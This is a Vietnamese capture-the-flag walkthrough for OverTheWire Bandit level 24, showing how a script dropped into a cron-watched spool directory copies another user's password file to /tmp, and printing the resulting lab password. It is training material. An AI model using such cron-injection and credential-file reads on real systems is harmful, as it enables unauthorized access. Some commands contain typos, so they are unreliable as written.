

# Bandit Level

## 🧩 Challenge: Level 24

## 📝 Description
Một chương trình đang chạy tự động theo các khoảng thời gian đều đặn từ cron, trình lập lịch tác vụ theo thời gian. Hãy xem cấu hình trong /etc/cron.d/ và xem lệnh nào đang được thực thi.

LƯU Ý: Cấp độ này yêu cầu bạn phải tạo tập lệnh shell đầu tiên của riêng mình. Đây là một bước rất lớn và bạn nên tự hào khi vượt qua cấp độ này!

LƯU Ý 2: Lưu ý rằng tập lệnh shell của bạn sẽ bị xóa sau khi được thực thi, vì vậy bạn có thể muốn giữ một bản sao…


> Link: https://overthewire.org/wargames/bandit/bandit24.html

---

## 🧠 Chiến lược giải
- Tìm cách chẹn một đoạn script vào script chính và tạo 1 file để lưu mật khẩu khi chương trình thực thi.

## Cộng cụ

1. **mkdir (make directory)**
- Là lệnh dùng để **tạo thư mục mới** trong Linux.
Cú pháp:
```
mkdir [tuy_chọn] ten_thư_mục
```
---


## 🛠️ Cách giải
1. Theo mô tả đề ta vào `/etc/cron.d/` để kiểm tra

```
cat cronjob_bandit24
```
Sau đó:
```
cat /usr/bin/cronjob_bandit24.sh
```
- sau khi đọc tệp shell ta nhận được đoạn mã ngôn ngữ `bash` như sau:
  
<img width="560" height="288" alt="image" src="https://github.com/user-attachments/assets/a209b67b-1a6a-4d65-b23a-1c2aa2881c36" />

2. Tạo thư mục phụ để lưu mật khẩu

```
mkdir /tmp/savepass/
```
Sau đó:
```
nano sript.sh
```
- Tạo thư mục để lưu sript như sau: `cat /etc/dandit_pass/bandit24 > /tmp/savepass/password.txt  `

3. Kiểm tra quyền thực thi của file `sh` mới tạo

```
ls -l script.sh
```
Sau đó:

```
chmod 777 script.sh
```
- Cấp cho file có quyền đọc, ghi, và thực thi.
---

4.Chuyển đoạn `script` vào đoạn script lớn

```
cp script.sh /var/spool/bandit24/foo/
```
- đợi một lúc rồi dùng dòng lệnh sau để lấy password.

```
cat password.txt
```

## 🏁 Password

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
